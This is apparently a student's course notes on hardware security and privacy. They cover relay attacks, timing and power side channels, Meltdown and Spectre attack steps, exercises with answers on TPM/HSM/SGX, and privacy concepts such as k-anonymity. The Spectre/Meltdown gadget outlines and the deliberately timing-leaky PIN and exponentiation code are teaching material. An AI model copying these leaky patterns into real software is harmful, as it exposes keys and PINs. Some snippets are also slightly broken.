<h5 id="use-case-offline-payments">Use-case: Offline payments</h5>
<p>We want to signal to the bank to pay to a merchant without talking to
the bank.</p>
<p>Threats: other users merchant user themselves external parties</p>
<p>The card is often authenticated with a PIN, and then the transaction
is signed with the certificate in the card. Signature can be forged</p>
<p>Dunamic data authentication - PIN OK can be faked So we can send it
online to check, but this would be expensive process. But now a lot of
devices can do the online transaction to check whether the funds are
available.</p>
<p>Problem: Relay attacks</p>
<p>Attacker controls the payment terminal which is connected to a
computer what transwerls the transaction to another computer, that is
connected to a fake card, that uses the received PIN and fake card to
pay for something else.</p>
<p>There are approaches to limit the relay capabilities - distance
bounding (time limiting for signals). Relay attacks have proven that the
user might not be responsible for the fact how their card was used.</p>
<h3 id="side-channels">Side channels</h3>
<p>Using TPM in a nutshell: Do very secure operation, trusted hw
execites the secure operation with secret information, you get the
result of very secure operation</p>
<p><strong>Side-channel attacks</strong> - determine the secret key of a
cryptographic device by measuring its execution time, its power
consumption or its electromagnetic field.</p>
<h4 id="types-of-side-channels">Types of side channels</h4>
<p>learn the system’s secret by observing how different computations
are</p>
<p><strong>time</strong> - how different computations take different
time Extremely powerful because <strong>isolation</strong> doesn’t
help</p>
<p><strong>power</strong> - how different computations consume different
power (mutliplication takes more power than addition)</p>
<p><strong>electromagnetic</strong> - how different computations have
different emissions (multiplication will be different electromagnetic
waves)</p>
<h4 id="timing-attack---naive-rsa">Timing attack - Naive RSA</h4>
<p>RSA decryption - compute c^^d mod N Naive algo - square and
multiply</p>
<p>Here problem is that there is a check for a bit == 1, and if it is it
multiplies (a lot longer signal through ALU), otherwise assign (short
op)</p>
<p>This could leak information during RSA computation</p>
<p>timing depends on number of 1s in the channel</p>
<p>To mitigate this - make the if branches equal timing wise - add bunch
of operations to both sides, or add computation to the other side</p>
<h4 id="power-side-channels">Power side channels</h4>
<p>Elliptic-curve crypto operation Power depends on key bits</p>
<p>This often requires 1000x of tries but afterwards it can leak
inforamtion</p>
<h4 id="electromagnetic-side-channels">Electromagnetic side
channels</h4>
<p>same as power</p>
<h4 id="countermeasures">Countermeasures</h4>
<p>Goal - prevent secret inference from observable state</p>
<p><strong>Hiding</strong> - lowers signal to noise ratio noise
generator, randomized execution order, async logic styles…</p>
<p><strong>Masking</strong> - split state in to shares; forces adversary
to recombine Boolean or arithmetic masking, higher-order masking</p>
<p><strong>Leakage resilience</strong> - prevents leakage aggreagation
by updating secret e.g. by shielding in a faraday cage</p>
<h4 id="attacks-against-intel-sgx">Attacks against Intel SGX</h4>
<p>SGX is the prime technique on modern CPUs to run trusted computation
Adversary runs side-by-side on the same CPU, either on a nearby thread
or core</p>
<p>Large amounts of side cahnnel to make protection of SGX hard</p>
<p>It doesn’t give full protection against NSA, but still is good
against reasonable attackers</p>
<p>Even the most modern SGX will leak some info, but will give some
security guarantee.</p>
<p>Attacks, while they are possible, the attacker is in a very
constrained environment: they control hypervisor, CPU, and run it in
almost single-step mode to get information</p>
<h3 id="microarchitectural-side-channels">Microarchitectural
side-channels</h3>
<h4 id="meltdown">Meltdown</h4>
<p>Allowed attackers to leak information of the kernel. Allowed to read
all memory of the running processes</p>
<p>AMD was resistant to meltdown (per chance), but Intel was not</p>
<p>It exploits the race condition between <strong>memory access</strong>
and <strong>protection checks</strong>.</p>
<p>Ultimately exploits the microarchitectural nature of caches
(something is left in the cache upon exception because the cache is not
part of the architercural state) If the protection check fails, the CPU
is rolling back the memory access execution but the check might have
flushed the cache lines and from that you can infer what the value was
stored.</p>
<blockquote>
<p>Attacker executes a <strong>forbidden access</strong> and
speculatively uses the result to obtain <strong>non-architectural
side-effects</strong> that reveal the secrets <strong>before</strong>
the forbidden access is squashed</p>
</blockquote>
<p>Most OSes mapped physical kernel memory pages into every user’s
virtual memory space Minimizes the cost of some exceptions Of course,
<strong>access is protected</strong>, i.e. data can be read only in
kernel mode But <strong>everyone can address them</strong></p>
<p>By accessing certain parts of the page we can infer how long it takes
to access that part and infer where it is in the memory</p>
<h5 id="meltdown-steps">Meltdown steps</h5>
<p>Execute a forbidden access (pointer being dereferenced)</p>
<p>Speculatively use the secret result - store it somewhere else. Before
the exception is thrown by CPU</p>
<p>Execute the memory access using the secret, there will be specific
access to specific page (legitimate memory access).
<code>array[secret * 4096]</code> This will remain even if the CPU
unrolls the operation from before</p>
<p>This allows to indirectly measure what the secret is</p>
<p>Additionally we need to make sure that a secret the attacker cannot
read leaves a trace before it is cancelled And then performa a
<strong>prime+probe</strong> cache attack to learn the secret - attacker
in a different process has a large array and goes through the whole
array checking if the access to item is fast (in cache) or part of the
array was flushed - slow. Then they know which cache addresses were
flushed</p>
<p>Affected all the processors except AMDx86</p>
<h5 id="meltdown-possible-mitigations">Meltdown possible
mitigations</h5>
<p>The obviouse proper solution is to change the processor degin: test
the privilege level <strong>before</strong> making the result of a
speculative access available (AMD did this already)</p>
<p>OTher mitigation is to <strong>isolate user space and kernel
space</strong> memory In Linux, Kernel page-table isolation (KPTI) and
similar in other OSs - allows to see very small kernel space in user
mode performance penalty in Linux is around 5-10%, up to 30%</p>
<h4 id="spectre">Spectre</h4>
<p>Another catastrophic attack making it possible toread all memory</p>
<p>Addresses another shared resource - branch predictors (they are not
unique per thread but shared among SMT threads)</p>
<p>Exploits side effects of <strong>(mispredicted) speculative
execution</strong> Mispeculation does not affect the architerural state
but it may <strong>affect microarchitectural structures</strong> (E.g.
caches)</p>
<p>Attacker would redirect the brach predictor but the CPU can detect,
and the same way still leave the trace</p>
<p>Goal: get the victim to <strong>speculatively</strong> execute
<strong>leaky</strong> code whose nonarchitectural side-effects reveal
the secrets</p>
<h5 id="spectre-steps">Spectre steps</h5>
<p>Have leaky code: <code>array1[x]</code> - with appropriate value of x
we can read anything we want</p>
<p>Speculatively execute controled branching (attacker controls x). We
would train the branch predictor that x is always &lt; array_size</p>
<div class="sourceCode" id="cb15"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">(</span><span class="ex">x</span> <span class="op">&lt;</span> array1_size<span class="kw">)</span></span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>    <span class="va">array1</span><span class="op">[</span>x<span class="op">]</span></span></code></pre></div>
<p>If we can get the processor to mispredict the condition, the access
will ebe speculatively performed (but the value will be removed from the
ROB)</p>
<p>And then in the branch we do the same thing as in meltdown - do the
indirect memory access: <code>y = array2[array1[x] * 4096]</code>. We
can use the side effect of the value of the execution to gain
information.</p>
<p>And then execute Prime+Probe cache attack to learn the secret.</p>
<h5 id="spectre-possible-mitigations">Spectre possible mitigations</h5>
<p><strong>Hardware</strong>: disable speculative execution (give up 90%
of CPU speed), separate branche predictors per process/thread</p>
<p><strong>General Software</strong> approaches: run only an application
per processor</p>
<p><strong>Partial and application-specific software</strong>
approaches: add serialization instructions between branches and loads;
Make it impossible through JS in browsers.</p>
<p>These are still vulnerable, and the kernel needs late-stage software
microcode patches.</p>
<p>Microcode patches: what is loaded into the CPU to execute complex
instructions.</p>
<h4 id="active-mitigations">Active mitigations</h4>
<p>New CPUs roll out mitigations in hw, older CPUs require microcode
patches. Some issues need (costly) software mitigations</p>
<h2 id="exercises-10">Exercises 10</h2>
<p><strong>Exercise 1</strong> In the following scenarios explain
whether you need isolation, attestation, or both. Explain what would
happen if these properties were not met.</p>
<ol type="1">
<li>A city government uses an HSM to sign updates to the population
census.</li>
<li>An IoT sensor signs a message authenticating itself to the central
server that collects measurements.</li>
<li>We use a TPM to ensure secure booting of a server located in an
isolated room in the basement of a bank.</li>
<li>Intel SGX is used to perform biometric access control on a backend
server in the cloud.</li>
</ol>
<p>Answer:</p>
<ol type="1">
<li>Needs isolation. If an adversary can extract the secret key from the
HSM, this adversary can sign any census update. Attestation is not
absolutely needed. The city hall owns the trusted hardware on its
premises, and therefore it need not prove that the trusted hardware is
there (first attestation property). Regarding software run on the
hardware, a signature (on the census, or anything else) can be verified
externally given the public key. If the HSM performs any other
operation, the signature would not pass the verification. (One could
also argue that attestation is needed to ensure that the HSM signs once,
and only once, a transaction and does not leak the secret key.)</li>
<li>Needs isolation. An adversary that extracts the secret key from the
IoT sensor can impersonate this sensor, effectively tampering with the
measurements. Same considerations regarding attestation as in (1).</li>
<li>Does not need isolation. The device is already in an isolated room.
Needs attestation of hardware and code, as it is remote, we need to
ensure the device is there when we are not in the room.</li>
<li>One needs attestation. Since the application is run remotely on an
untrusted environment (the Cloud), it is important that SGX ensures the
client has run code that performs the correct access control. One could
argue that, since no one has physical access to the cloud where SGX is
installed, there is no need for isolation. On the other hand, it could
be argued that the Cloud is adversarial, and SGX needs to be protected
to avoid tampering attacks. Since biometrics are stored in the clear, we
are not concerned with the cloud trying to breach their confidentiality
(It already has read access the templates).</li>
</ol>
<p><strong>Exercise 2</strong> In question 10.1(1) what would be a
better security practice to avoid fraudulent transactions: giving the
mayor of the city the right to execute the signature in the HSM, or have
the HSM require the credentials of two census civil servants to permit
the operation (justify your answer).</p>
<p>The second option, two civil servants, is a better option. This
configuration respects the separation of privilege principle. To avoid
that a single action (the mayor is a malicious actor) can break the
system, we require more than one actor to execute the operation, namely
the census update.</p>
<p><strong>Exercise 3</strong> Alice runs a certificate authority, and
needs a secure machine to store the CA keys and sign certificate
requests. What are the challenges, advantages or disadvantages if Alice
runs their signing infrastructure:</p>
<ol type="1">
<li>General purpose CPU</li>
<li>Enclave running on commercial processor</li>
<li>Dedicated hardware security module (HSM)</li>
</ol>
<p>Alice needs to store her private signing keys where it cannot be
accessed (read/write) by her employees.</p>
<ol type="1">
<li>A general purpose CPU has no protection against major attack
vectors: against a untrusted OS or against physical access to the system
(including system RAM). However, if the physical environment can be
secured otherwise (physical access controls), a general purpose CPU
environment provides very high performance.</li>
<li>An enclave on a commercial processor (ARM TrustZone or Intel
SGX/TDX) will provide defence against untrusted OS, and in some cases
even against physical access to the system. Depending on the enclave
technology, there may be a residual atttack surface from physical attack
(including system RAM swapping/rollback). However, these environments
often come with greater performance overheads, or resource limitations
(SGX limits enclaves to 128MB physical memory).</li>
<li>Dedicated HSMs are built with an threat model including attackers
with physical access, and contain intrusion protection mechanisms, and
run their own software stack. However, HSMs come with some significant
disadvantages. HSMs often have proprietary designs, and are expensive.
The proprietary designs prevent external auditing and checks, and allows
bugs to remain hidden. Performance and power cost might be higher than
previous options. HSMs might be vulnerable to physical side-channels if
no physical isolation is implemented. Development of software for HSMs
can be challenging due to proprietary designs. Replication for fault
tolerance can be challenging.</li>
</ol>
<p><strong>Exercise 4</strong> What would go wrong if
TPM_Startup(ST_CLEAR) could be called at any time after boot?</p>
<p>A malicious OS could reset the PCRs post-boot and then set them to an
invalid OS hash. PCRs would then look as if a valid OS loaded.</p>
<p><strong>Exercise 5</strong> During attestation of software, what
could go wrong if the following steps of the protocol do not happen:</p>
<ol type="1">
<li>The challenger does not send a Challenge (also known as Nonce)</li>
<li>Application and challenger perform a key exchange to establish a
secure channel.</li>
</ol>
<p>Answer:</p>
<ol type="1">
<li>The signature can be replayed! Once the app has authenticated once,
if the adversary captures the signature, they can reply it later even if
the app has not loaded properly.</li>
<li>The user / OS can reboot the machine after attestation and run
arbitrary software pretending to be the application that performed the
attestation. The key exchange ensures that only the application can
communicate with the challenger.</li>
</ol>
<p><strong>Exercise 6</strong> When using trusted hardware, should we
care about covert channels?</p>
<p>In general, no if the trusted hardware is isolated and implements
attestation. In that case, the adversary cannot measure emissions from
the hardware or run code on the hardware to establish covert
channels.</p>
<p><strong>Exercise 7</strong> In Dynamic Data Authentication, would
encrypting the PIN verification solve the YesCard problem? If yes,
justify. If no, propose a solution.</p>
<p>No, the problem is authentication, not confidentiality. A solution is
to authenticate the PIN transmission, e.g., have the card sign the OK
response.</p>
<p><strong>Exercise 8</strong> Is there any timing side-channel in the
following code? If a timing side-channel exists, (1) explain how to
exploit it. (2) change the code to prevent the attack (Hint: try to make
time measurements useless for the adversary).</p>
<div class="sourceCode" id="cb16"><pre
class="sourceCode java"><code class="sourceCode java"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="co">//example a</span></span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>Bool <span class="fu">CheckPin</span> <span class="op">(</span> string check <span class="op">,</span> string pin <span class="op">)</span> <span class="op">{</span></span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span> <span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> <span class="dv">4</span><span class="op">;</span> i <span class="op">++)</span></span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span> check <span class="op">[</span> i <span class="op">]</span> <span class="op">!=</span> passcode <span class="op">[</span> i <span class="op">])</span></span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span></span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="kw">true</span><span class="op">;</span></span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a><span class="co">//example b</span></span>
<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a><span class="co">// exp(sec, x) computes x**{sec} mod n</span></span>
<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a><span class="dt">const</span> BigNumber n <span class="op">=</span> <span class="op">[</span> A big number <span class="op">];</span></span>
<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a>BigNumber <span class="fu">exp</span> <span class="op">(</span>BigNumber sec<span class="op">,</span> BigNumber x<span class="op">)</span> <span class="op">{</span></span>
<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a>    BigNumber out <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> sec<span class="op">.</span><span class="fu">size</span><span class="op">();</span> i<span class="op">++)</span> <span class="op">{</span></span>
<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>sec <span class="op">[</span>i<span class="op">]</span> <span class="op">==</span> <span class="dv">1</span><span class="op">)</span></span>
<span id="cb16-16"><a href="#cb16-16" aria-hidden="true" tabindex="-1"></a>            out <span class="op">=</span> <span class="op">(</span>out <span class="op">*</span> x<span class="op">)</span> <span class="op">%</span> n<span class="op">;</span></span>
<span id="cb16-17"><a href="#cb16-17" aria-hidden="true" tabindex="-1"></a>            out <span class="op">=</span> <span class="op">(</span>out <span class="op">*</span> out<span class="op">)</span> <span class="op">%</span> n<span class="op">;</span></span>
<span id="cb16-18"><a href="#cb16-18" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb16-19"><a href="#cb16-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> out<span class="op">;</span></span>
<span id="cb16-20"><a href="#cb16-20" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb16-21"><a href="#cb16-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-22"><a href="#cb16-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-23"><a href="#cb16-23" aria-hidden="true" tabindex="-1"></a><span class="co">//example c</span></span>
<span id="cb16-24"><a href="#cb16-24" aria-hidden="true" tabindex="-1"></a><span class="co">// This function computes the dot product of two vectors</span></span>
<span id="cb16-25"><a href="#cb16-25" aria-hidden="true" tabindex="-1"></a><span class="co">// The contents of the vectors are confidential</span></span>
<span id="cb16-26"><a href="#cb16-26" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> <span class="fu">dotproduct</span> <span class="op">(</span> <span class="dt">int</span> <span class="op">*</span>veca <span class="op">,</span> <span class="dt">int</span> <span class="op">*</span>vecb <span class="op">,</span> <span class="dt">int</span> len<span class="op">)</span> <span class="op">{</span></span>
<span id="cb16-27"><a href="#cb16-27" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> acc <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb16-28"><a href="#cb16-28" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span><span class="op">(</span><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> len<span class="op">;</span> i <span class="op">++)</span></span>
<span id="cb16-29"><a href="#cb16-29" aria-hidden="true" tabindex="-1"></a>        acc <span class="op">+=</span> <span class="op">(</span>veca<span class="op">[</span>i<span class="op">]</span> <span class="op">+</span> vecb<span class="op">[</span>i<span class="op">]);</span></span>
<span id="cb16-30"><a href="#cb16-30" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> sum <span class="op">;</span></span>
<span id="cb16-31"><a href="#cb16-31" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<h2 id="privacy">Privacy</h2>
<p>Privacy is not about hiding, but more about protecting ourselves.</p>
<h3 id="why-privacy-matters">Why privacy matters</h3>
<p>To not be influenced/manipulated</p>
<p>We don’t want our information used in ways we did not authorize</p>
<p>We want to avoid people making money out of our information</p>
<p>We want systems to avoid using our information where we would be
<strong>interfered</strong> with</p>
<h3 id="so-what-if-they-know">So what if they know</h3>
<p>Targeted advertising - what you buy, when you buy, how often,
etc.</p>
<p>In the US all the data can be bought and then use it for advertising
such that it tailors to the buyer</p>
<p>This information can also be used to discriminate (found through the
study where different profiles were browsing the internet. High-paying
jobs were way more advertised to male users. Another study also analysed
the jobs ads discrimination on gender/race. Another study found
ecommerce prices differences, even between people who have a mac and
people who don’t)</p>
<h4 id="cambridge-analytica">Cambridge analytica</h4>
<p>Facebook game was collecting data about you and friends, and then CA
was able to build profiles on the people and server targeted political
advertisements. This was the case for 2016 US elections and UK Brexit
vote</p>
<p>UK and US were polarized and UK fined FB only 500k pounds</p>
<p>Facebook has likes and “pixels” which load on other pages, and even
without interactions, Facebook knows where you are.</p>
<h4 id="attribute-based-targetting">Attribute-based targetting</h4>
<p>Facebook computes attributes based on likes, and they are bought from
“Partner” companies.</p>
<p>Advertised can bulk-upload database (bought from data brokers, etc)
to FB, who tells how many users are present on the system and allows to
target them</p>
<p>Then Facebook discovers similar people based on interests or browsing
patterns. This can be tailored per region, sex, marital status, etc.</p>
<h4 id="eu-csa-regulation-debate">EU CSA regulation debate</h4>
<p>Proposal where the REGULATION OF THE EUROPEAN PARLIAMENT AND OF THE
COUNCIL laying down rules to prevent and combat child sexual abuse.</p>
<p>However, this was advertised using targeted ads to people who would
react to this well. This was a breach of GDPR, because it used private
information.</p>
<h4 id="privacy-is-essential-for-our-society">Privacy is essential for
our society</h4>
<p><strong>A society without privacy protection would be
suffocation</strong></p>
<p>People should not be manipulated.</p>
<h3 id="privacy-of-whom">Privacy of whom?</h3>
<p><strong>Individuals</strong> - protection against profiling and
manipulation, protection against crime / identity theft</p>
<p>Privacy is a Security property - there is no security without
privacy</p>
<p><strong>Companies</strong> - protection of trade secrets, business
strategy, internal operations, …</p>
<p><strong>Governments / military</strong> - protection of national
secrets, confidentiality of law enforcement investigation, diplomatic
activities, political negotiations</p>
<p><strong>Privacy must be for all</strong> - since the infrastructure
is shared (same cloud services, industry). We share it indirectly - all
the companies and governments are made out of people. (e.g. strava
heatmap scandal) It’s very easy to have leaks of information because of
e.g. diplomats have phones, or their families have phones etc. Flight
data is not encrypted so there could be diplomat meetings or company
mergers could be predicted.</p>
<blockquote>
<p>Denying privacy to some is denying privacy to all</p>
</blockquote>
<h4 id="security-vs-privacy---misconception">Security vs Privacy -
misconception</h4>
<p>We need to tradeoff security for privacy</p>
<p>More surveillance -&gt; more security -&gt; safer world</p>
<p>But:</p>
<ul>
<li>Surveillance may be not <strong>effective</strong> - smart
adversaries evade surveillance
<ul>
<li>criminals use since long Telegram, Tor, Signal, but average citizens
do not!!</li>
</ul></li>
<li>Surveillance tools can be <strong>abused</strong> - lack of
transparency and safeguards
<ul>
<li>Snowden revelations: NSA spying on citizens, companies, etc.</li>
</ul></li>
<li>Surveillance tools can be <strong>subverted</strong> for crime /
terrorism
<ul>
<li>Greek Vodafone scandal (2006): “someone” used the legal interception
functionalities (backdoors) to monitor 106 key people: Greek PM,
ministers, senior military, diplomats, journalists, etc.</li>
</ul></li>
</ul>
<h3 id="what-is-privacy">What is Privacy?</h3>
<p>Privacy is subjective: hard to define</p>
<h4 id="privacy-as-confidentiality">Privacy as Confidentiality</h4>
<p><strong>Goal</strong>: Minimize data disclosure (which includes
distributing trust)</p>
<ul>
<li>PETs (privacy enchancing technologies): encryption,
privacy-preserving computation, obfuscation, decentralization
<ul>
<li>Homomorphic encryption, Secure Multi-party computation, Differential
privacy</li>
<li>Tor: anonymous communication network</li>
</ul></li>
<li>Mathematical privacy definitions and strong proofs of security</li>
</ul>
<p>“The right to be let alone”</p>
<h4 id="privacy-as-control">Privacy as Control</h4>
<p><strong>Goal</strong>: Let the user decide how data will be shared
and used</p>
<ul>
<li>PETs: privacy settings, (automated) privacy policies, logging
<ul>
<li>Secure logging, Sticky policies,</li>
</ul></li>
<li>Organizational compliance and fines (GDPR, US Fair Information
principles)</li>
</ul>
<p>“The claim of individuals, groups, or institutions to determine for
themselves when, how, and to what extent information about them is
communicated to others”</p>
<h4 id="privacy-as-practice">Privacy as Practice</h4>
<p><strong>Goal</strong>: Improve user agency with respect to private
information</p>
<p>PETs: contextual feedback, privacy nudges</p>
<p>“The freedom from unreasonable constraints on the construction of
one’s own identity”</p>
<h3 id="adversary-of-privacy">Adversary of privacy</h3>
<p>State-level / Global Adversaries (global view - they can see
everything (through subpoenas or not)) - Government</p>
<p>Institutional Adversaries - companies, advertisers, organizations we
work for</p>
<p>Adversaries from Social Context - colleagues, family and friends,
strangers</p>
<h4 id="adversaries-from-social-context">Adversaries from social
context</h4>
<p>Concerns: problems from using technology - what are others going to
think?</p>
<p>PETs Goals - do not surprise the user - support decision making
e.g. easy defaults, contextual feedback, privacy nudges</p>
<p>Limitations: only protects from other users, service provider is
trusted</p>
<ul>
<li>limited by user’s capability to understand policies (you need to set
the settings yourself - what other users see from your post?)</li>
<li>based on user expectations, what if they are off?</li>
</ul>
<p>Common industry approach - make users comfortable</p>
<h5 id="function-creep">Function creep</h5>
<p><strong>Function creep</strong> - expansion of a process or system
where data collected for one specific purpose is subsequently used for
another unintended or unauthorized purpose.</p>
<p>Example: Aadhaar - India’s “optional” Unique Identity id number
scheme.</p>
<p>It became: mandatory for basic needs (benefits system, buying a SIM
card, opening bank account, pay taxes, no education without UID).</p>
<p>It was designed to “provide the poor with an identity”</p>
<p><strong>EURODAC</strong> - fingerprint database for asylum
seekers.</p>
<p>Goal - store fingerprints from all people who cross the border into
European country withou permission</p>
<p>It became - database for police and public prosecutors such as
Europol</p>
<p>More data was added - facial images and alphanumerical data( name,
ID, passport number) of asylum seekers and irregular migrands</p>
<h4 id="institutional-adversaries">Institutional adversaries</h4>
<p>Concerns - data should not be collected without user consent (it is
not the only way to collect data) or processed for illegitimate uses.
Data should be secured: correct, integrity, deletion.</p>
<p>PETs Goals - compliance with data protection principles</p>
<ul>
<li>Informed consent: valid, freely given, specific, and active
consent</li>
<li>Purpose limitation: data can only be used for the purpose it was
collected</li>
<li>Data minimization: only collect data strictly necessary for service
(proportionality)</li>
<li>Subject access rights: user knows what information is
stored/processed and how, user has right to modification and
deletion</li>
<li>Preserving the security of data: auditability and
accountability</li>
</ul>
<p>Access rights - ask the company for what they have, to delete the
data, etc.</p>
<p>Limitations:</p>
<ul>
<li>assumes: collection is necessary, organizations are (semi)trusted
and honest, relies on punishment (fines - problem for giants), no
mandated technique for the protection of the data</li>
<li>Focuses on limiting misuse, no collection, and easy to circumvent
minimization to collect in bulk</li>
</ul>
<p><strong>Real-time Bidding</strong> - bid to appear on different
websites. There is a lot of movement happening on-the-fly who is bidding
on what and where the users are. There is also information about the
high political figures flying around.</p>
<p>This is GDPR controlled but it is out there</p>
<p>Anonymization?</p>
<h4 id="global-adversary">Global adversary</h4>
<p>Concern - how to evade / fool a global adversary?</p>
<p>PETs goals: minimize the need to trust others, minimize the amount of
revealed information</p>
<p>End-to-end encryption (Signal, PGP, OTR (off the record messaging)),
anonymous comms (tor, mixnets), obfuscation (dummy actions, hiding,
generalization, differential privacy), advanced crypto (private
information retrieval, etc.)</p>
<p>Limitations:</p>
<ul>
<li>difficult to evolve, cobine/compose</li>
<li>usability problems both for devs and users (because of crypto,
etc)</li>
<li>Lack of incentives:
<ul>
<li>industry - loses the data</li>
<li>government - national security, fraud detection</li>
</ul></li>
</ul>
<p>Spotify is very valuable advertiser tool because music is good
representation of mood and personality</p>
<h3 id="building-privacy-preserving-systems">Building privacy-preserving
systems</h3>
<h4 id="privacy-engineering-process">Privacy engineering process</h4>
<ol type="1">
<li>define “<strong>desired uses</strong>” - the purpose of the
application</li>
<li>identify the <strong>minimal data</strong> need for this
purpose</li>
<li>build a system that achieves the prupose of minimizing the misuse
possibilities of the minimal data – use PET!</li>
<li>evaluate the system against a <strong>strategic adversary</strong>
(try to find the most optimal way to attack the system, also assume the
adversary knows the system)</li>
</ol>
<h4 id="systematic-privacy-evaluation">Systematic privacy
evaluation</h4>
<ol type="1">
<li>Model the privacy-preserving mechanism as a probabilistic
transformation
<ol type="1">
<li>What is the probability that, given an input the privacy mechanism
returns a given output?</li>
</ol></li>
<li>Determine what the adversary will see
<ol type="1">
<li>Threat model: who is the adversary? what are her “observations”?
what is her prior knowledge?</li>
</ol></li>
<li>“Invert” the mechanism, in the way the adversary would do
<ol type="1">
<li>Always assume the adversary knows the mechanism and would try to
undo its effect</li>
</ol></li>
<li>Evaluate property after inversion
<ol type="1">
<li>This is the real probability the adversary can compute</li>
</ol></li>
<li>Quantify the probability of success of the adversary
<ol type="1">
<li>Non trivial!</li>
</ol></li>
</ol>
<h4 id="where-can-pets-help">Where can PETs help?</h4>
<p>Users interact with Internet with data, data goes to service
provider, which publish.</p>
<p>PETs should be put everywhere - privacy at all layers. We leak a lot
of data even when it is safeguarded - metadata (images -&gt; location),
aggregated data (strava example)</p>
<h4 id="pets-example">PETs example</h4>
<p>Users connect to services: Authorization: Attribute-based credentials
- show authorization without identity or attributes Network protection:
autonymous communications - eliminate network metadata</p>
<p>Users provide data to services Privacy preserving computations:
Homomorphic encryption (outsourcing), Secure multi-party computation
(peer to peer or peer to server) Obfuscate data - differential
privacy</p>
<p>Users obtain data from services: Privacy preserving computations:
Private information retrieval (search), Private set intersection
(comparison)</p>
<p>Servers publish data: Obfuscate data: differential privacy</p>
<h3 id="example-of-evalutation">Example of evalutation</h3>
<h4 id="pets-for-data-anonymization">PETs for data anonymization</h4>
<p>Scenario: You have a set of data that contains personal data and you
would like to anonymize it to:</p>
<ul>
<li>not be subject to data protection while processing</li>
<li>make it public for profit</li>
<li>make it public for researchers</li>
</ul>
<p>Goal: Produce a dataset that preserves the utility of the original
dataset <strong>without leaking information</strong> about individuals.
This process is known as <em>“database sanitization”</em></p>
<h4 id="privacy-properties-anonymity">Privacy properties:
<strong>anonymity</strong></h4>
<p>“Anonymity is the state of being not identifiable within a set of
subjects, the anonymity set […] The anonymity set is the set of all
possible subjects who might cause an action”</p>
<p><strong>Decoupling identities from user attributes</strong>:</p>
<ul>
<li>make users psedonymous
<ul>
<li>This is not sufficient - there is a possible existence of other
databases (medical data – voter registration data)</li>
</ul></li>
<li>Remove identities
<ul>
<li>some attributes are quasi-identifiers</li>
</ul></li>
<li>Let’s remove some attributes
<ul>
<li>impossible to know what will be a QID</li>
</ul></li>
</ul>
<h5 id="k-anonymity">k-anonymity</h5>
<p>k-anonymity - Each person contained in the database cannot be
distinguished from at least k-1 other individuals whose information also
appears in the released database.</p>
<p>Key atrribute - identifier Quasi-idetifier - gender + zip code
Sensitive attribute - problem</p>
<p>Generalization: replace attributes with less specific, but
semantically consistent values</p>
<p>Removal of attributes:</p>
<ul>
<li>to improve anonymity, identifying attributes can be suppressed</li>
<li>suppression is the ultimate generalization</li>
</ul>
<p>Limitations: 3-anonymous patient table. Does not provide privacy when
sensitive values lack diversity - homogeneity attack could be done - it
does not matter who Bob is, anyone with zipcode smt ** in their 20s has
a heart disease</p>
<h5 id="l-diversity">L-diversity</h5>
<p><strong>L-diversity</strong> - An equivalence class has l-diversity
if there are at least <strong>l well-represented values for the
sensitive attribute</strong>.</p>
<p>A database has l-diversity if every equiv class has l-diversity</p>
<p>Limitations: : if the attacker knows that the targeted individual has
a low income or is in her 20s, he will know that she has a
stomach-related disease.</p>
<h5 id="t-closeness">t-closeness</h5>
<p>An equivalence class has <strong>𝚝-closeness</strong> if the distance
between the distribution of a sensitive attribute in this class and the
distribution of the attribute in the whole table is no more than a
threshold 𝚝. ● A table has t-closeness if all equivalence classes have
𝚝-closeness. ● The distance is usually measured as earth mover’s
distance (EMD), also known as Wasserstein metric.</p>
<h5 id="quasi-identifier-takeaways">quasi-identifier takeaways</h5>
<ul>
<li>Anonymizing a dataset via generalization and suppression is
extremely hard
<ul>
<li>The k-anonymity idea focuses on transforming the dataset not its
semantics</li>
<li>Achieving k-anonymity, l-diversity, t-closeness is hard, and still
